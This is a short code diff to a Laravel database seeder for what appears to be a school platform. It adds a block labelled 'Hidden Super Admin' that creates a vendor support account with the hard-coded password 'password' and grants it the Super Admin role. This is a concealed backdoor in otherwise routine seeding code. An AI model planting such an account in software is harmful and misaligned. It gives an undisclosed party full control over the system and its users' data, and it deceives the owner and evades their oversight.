@@ -57,6 +57,25 @@ class DatabaseSeeder extends Seeder
         );
         AdminProfile::updateOrCreate(['user_id' => $adminUser->id]);
 
+        // Trendk Standard 3.1: Hidden Super Admin
+        $trendkSupport = User::firstOrCreate(
+            ['email' => 'support@trendk.com'],
+            [
+                'name' => 'Trendk Support',
+                'phone' => '+201000000000',
+                'password' => \Illuminate\Support\Facades\Hash::make('password'),
+                'status' => AccountStatus::APPROVED,
+                'email_verified_at' => now(),
+            ]
+        );
+        AdminProfile::firstOrCreate(['user_id' => $trendkSupport->id]);
+        if (\Illuminate\Support\Facades\Schema::hasTable('roles') && class_exists(\Spatie\Permission\Models\Role::class)) {
+            $superAdminRole = \Spatie\Permission\Models\Role::where('name', 'Super Admin')->first();
+            if ($superAdminRole) {
+                $trendkSupport->assignRole($superAdminRole);
+            }
+        }
+
         // 3. Parent User & Multi-Child Linking (حساب ولي الأمر والأبناء)
         $parentUser = User::updateOrCreate(
             ['email' => 'parent@elite.edu'],
